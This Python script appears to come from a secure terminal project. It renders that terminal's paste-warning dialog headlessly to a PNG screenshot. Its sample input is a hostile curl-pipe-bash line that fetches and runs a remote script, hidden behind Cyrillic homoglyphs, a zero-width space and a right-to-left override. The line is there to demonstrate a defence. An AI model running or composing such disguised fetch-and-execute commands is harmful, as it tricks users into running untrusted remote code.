#!/usr/bin/python3
## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

"""Render the paste-warning dialog to a PNG, headless and deterministic.

The dialog is the real one the app shows -- secure_terminal.dialog.PasteWarningDialog
-- fed a representative hostile paste (a curl | bash line whose domain and shell
name hide Cyrillic homoglyphs, plus a zero-width and a bidi override), so the four
side-by-side panes and the three gated buttons appear exactly as a user would see
them. Used to generate the shot on the project's Pages site; run it again to
regenerate. No display is needed: it uses Qt's offscreen platform and grab().

Usage:
    tools/paste-warning-shot.py <output.png>

The payload is written with \\u escapes so this source stays plain ASCII; the
hidden characters live only in the rendered image.
"""

import os
import sys

# A headless grab needs no real display; force the offscreen platform before Qt
# initialises, unless the caller already chose one.
os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')

from PyQt6.QtWidgets import QApplication, QLabel     # noqa: E402
from PyQt6.QtGui import QPalette, QColor             # noqa: E402

from secure_terminal.dialog import PasteWarningDialog  # noqa: E402

# A paste that looks like an ordinary install one-liner but hides look-alikes and
# invisibles: the 'a' in "example" and in "bash" are Cyrillic (U+0430), there is a
# zero-width space (U+200B), and a right-to-left override (U+202E) reorders the
# trailing comment. Reveal exposes them; stripped drops all non-ASCII (the domain
# and "bash" visibly change); "with unicode" keeps the printable look-alikes but
# still removes the bidi and zero-width. Escaped so this file stays ASCII-only.
PAYLOAD = ('curl -fsSL https://ex\u0430mple.com/get.sh | b\u0430sh\u200b'
           '  \u202e# trusted mirror\n')

# A non-zero countdown so the shot shows the risky "Paste with unicode" button
# disabled and counting down -- the anti-fat-finger gate, visible.
COUNTDOWN_SECONDS = 4


def _light_palette(app):
    """A neutral light palette so the shot is identical regardless of the desktop
    theme the capture happens to run under (reproducible output)."""
    app.setStyle('Fusion')
    pal = QPalette()
    pal.setColor(QPalette.ColorRole.Window, QColor('#f4f4f5'))
    pal.setColor(QPalette.ColorRole.WindowText, QColor('#18181b'))
    pal.setColor(QPalette.ColorRole.Base, QColor('#ffffff'))
    pal.setColor(QPalette.ColorRole.Text, QColor('#18181b'))
    pal.setColor(QPalette.ColorRole.Button, QColor('#e4e4e7'))
    pal.setColor(QPalette.ColorRole.ButtonText, QColor('#18181b'))
    app.setPalette(pal)


def main(argv):
    if len(argv) != 2:
        sys.stderr.write('usage: %s <output.png>\n' % argv[0])
        return 2
    out = argv[1]

    app = QApplication([argv[0], '-platform', os.environ['QT_QPA_PLATFORM']])
    _light_palette(app)

    dialog = PasteWarningDialog(PAYLOAD, COUNTDOWN_SECONDS)
    # Constrain to a realistic window width and let the long instruction line
    # wrap, so the shot matches a normal-width window instead of stretching to
    # the instruction's one-line natural width (a presentation-only tweak; the
    # panes, buttons and text are the real dialog's).
    for label in dialog.findChildren(QLabel):
        label.setWordWrap(True)
    dialog.setFixedWidth(880)
    dialog.adjustSize()
    dialog.show()
    # let the layout settle and the first countdown tick paint before grabbing
    app.processEvents()
    app.processEvents()

    pixmap = dialog.grab()
    if not pixmap.save(out, 'PNG'):
        sys.stderr.write('failed to write %s\n' % out)
        return 1
    sys.stderr.write('wrote %s (%dx%d)\n'
                     % (out, pixmap.width(), pixmap.height()))
    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv))
